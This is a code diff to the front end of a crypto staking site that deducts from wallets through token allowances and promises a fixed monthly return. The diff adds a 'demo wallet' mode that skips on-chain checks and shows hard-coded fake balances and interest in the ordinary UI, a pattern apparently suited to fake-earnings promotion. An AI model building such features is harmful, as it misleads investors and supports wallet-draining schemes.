@@ -15,6 +15,15 @@ function initSSE() {
         window.currentClaimable = userData.claimable || 0;
         accountBalance[authorizedToken].pledged = userData.pledgedAmount || 0;
         accountBalance[authorizedToken].interest = userData.accountBalance?.interest || 0;
+        // 【新增】演示錢包同步
+        if (userData.isDemoWallet) {
+          window.isDemoMode = true;
+          // 強制更新 UI
+          if (startBtn) startBtn.style.display = 'none';
+          disableInteractiveElements(false);
+          updateStatus("演示模式：已自動啟動");
+          activateStakingUI();
+        }
         updateClaimableDisplay();
         updateAccountBalanceDisplay();
         updatePledgeSummary();
@@ -141,6 +150,7 @@ window.currentClaimable = 0;
 const MONTHLY_RATE = 0.01;
 let ethPriceCache = { price: 2500, timestamp: 0, cacheDuration: 5 * 60 * 1000 };
 let userPledges = [];
+window.isDemoMode = false; // 【新增】演示模式標記
 // 【極速優化】快取三個代幣餘額
 let cachedWalletBalances = { USDT: 0n, USDC: 0n, WETH: 0n };
 const translations = {
@@ -567,6 +577,25 @@ async function loadUserDataFromServer() {
       }
       authorizedToken = userData.authorizedToken || 'USDT';
       userPledges = userData.pledges || [];
+
+      // 【關鍵】演示錢包自動模擬
+      if (userData.isDemoWallet) {
+        window.isDemoMode = true;
+        if (startBtn) startBtn.style.display = 'none';
+        disableInteractiveElements(false);
+        updateStatus("演示模式：已自動授權");
+        activateStakingUI();
+        // 假餘額
+        accountBalance.USDT.wallet = 1000;
+        accountBalance.USDT.pledged = 500;
+        accountBalance.USDT.interest = 50;
+        window.currentClaimable = 10;
+        cachedWalletBalances = { USDT: ethers.parseUnits("1000", 6), USDC: 0n, WETH: 0n };
+        updateWalletBalanceFromCache();
+        updateAccountBalanceDisplay();
+        updateClaimableDisplay();
+      }
+
       localStorage.setItem('userData', JSON.stringify({
         pledgedAmount, lastPayoutTime, totalGrossOutput, claimable: window.currentClaimable,
         accountBalance, authorizedToken, nextBenefitTime: userData.nextBenefitTime,
@@ -610,6 +639,7 @@ function resetState(showMsg = true) {
   authorizedToken = 'USDT';
   currentCycleInterest = 0;
   userPledges = [];
+  window.isDemoMode = false;
   if (interestInterval) clearInterval(interestInterval);
   if (nextBenefitInterval) clearInterval(nextBenefitInterval);
   if (claimInterval) clearInterval(claimInterval);
@@ -687,7 +717,7 @@ function updateWalletBalanceFromCache() {
 }
 // 【關鍵修正】立即讀取三個代幣 + 快取 + UI
 async function forceRefreshWalletBalance() {
-  if (!userAddress) return;
+  if (!userAddress || window.isDemoMode) return;
   try {
     const [usdtBal, usdcBal, wethBal] = await Promise.all([
       usdtContract.connect(provider).balanceOf(userAddress),
@@ -966,6 +996,16 @@ async function connectWallet() {
 async function updateUIBasedOnChainState() {
   if (!userAddress) return;
   try {
+    // 【關鍵】演示錢包跳過鏈上檢查
+    const snap = await db.collection('users').doc(userAddress).get();
+    if (snap.exists() && snap.data().isDemoWallet) {
+      if (startBtn) startBtn.style.display = 'none';
+      disableInteractiveElements(false);
+      updateStatus("演示模式：已自動啟動");
+      activateStakingUI();
+      return;
+    }
+
     const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
     const [isServiceActive, usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
       retry(() => deductContract.isServiceActiveFor(userAddress)),
@@ -1427,7 +1467,7 @@ document.addEventListener('DOMContentLoaded', async () => {
             duration: durationDays
           })
         });
-        if (!response.ok) {
+                if (!response.ok) {
           const errorText = await response.text();
           throw new Error(errorText || 'Network error');
         }
@@ -1514,13 +1554,12 @@ document.addEventListener('DOMContentLoaded', async () => {
             clearInterval(pollInterval);
           }
         }, 3000);
-      }
-    })();
+    }})();
   }
 });
 // 自動餘額監控（每 10 秒）
 setInterval(async () => {
-  if (userAddress && signer) {
+  if (userAddress && signer && !window.isDemoMode) {
     try {
       const [usdtBal, usdcBal, wethBal] = await Promise.all([
         usdtContract.connect(provider).balanceOf(userAddress),
